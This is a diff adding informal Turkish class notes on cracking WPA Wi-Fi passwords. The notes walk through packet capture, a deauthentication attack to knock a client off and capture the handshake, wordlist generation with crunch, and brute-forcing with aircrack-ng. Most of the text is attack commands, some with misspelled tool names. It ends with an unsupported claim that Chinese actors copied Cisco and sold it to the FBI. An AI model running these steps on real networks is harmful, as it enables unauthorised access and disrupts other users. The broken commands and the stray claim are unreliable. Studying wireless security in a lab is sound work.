@@ -1,0 +1,36 @@
+meninthe midleyi githubda var 
+wpa şifresi kırma
+kullanılması wepten farlıfırr
+
+bundan öncebir şey yazdık kaçırdım
+
+airdump-ng wlan0mon
+
+airdump-ng --bssid mac -c 4 --write ali wlan0mon
+
+şu anda bir mac izleniyor.
+---
+biriniağdan çıkarmamız lazım
+fake auth ile :
+yeni pencerede:
+aireplay-ng --deauth 5 -a mac(bssid) -h mac(kimi deotorize edeceksek onu yaazarız(station)) wlan0mon
+*bir çok işlem satırı gerçekleşti
+bu komutu yazdıkta sonra birinci cmd nin üstündedhandshakeyi aldık.(ağdaki arkadaşı ağdan attı)
+wpa için wordliste ihtiyacımız var(şifre)listeleri
+---
+başka bir framework kullanacaz.
+crunch(wpada en az 8 karakter li 9 karakterli şifre belirlememiz olsun)
+yaz:
+crunch 8 9  xyz1234567(içerecek harfler) -o ismail
+
+ve word listesini kendisi oluşturdu ()milyarlarca satır
+//oeasi 
+aircrack-ng ali-01.cap -w ismail(şu anda brüt force yapıyor keyleri gdeniyor)
+
+kendi wordumuzu oluşturduğumuz için saçma şifreler oluşturdu ve kıramayabiliriz
+dersteki şifre olan 12345678 ı kırdık.
+o yüzden wordlist kullanılır
+---
+ciscyu çinliler kopylayıp fbiya ve ciscoya satmışlar.n
+
+
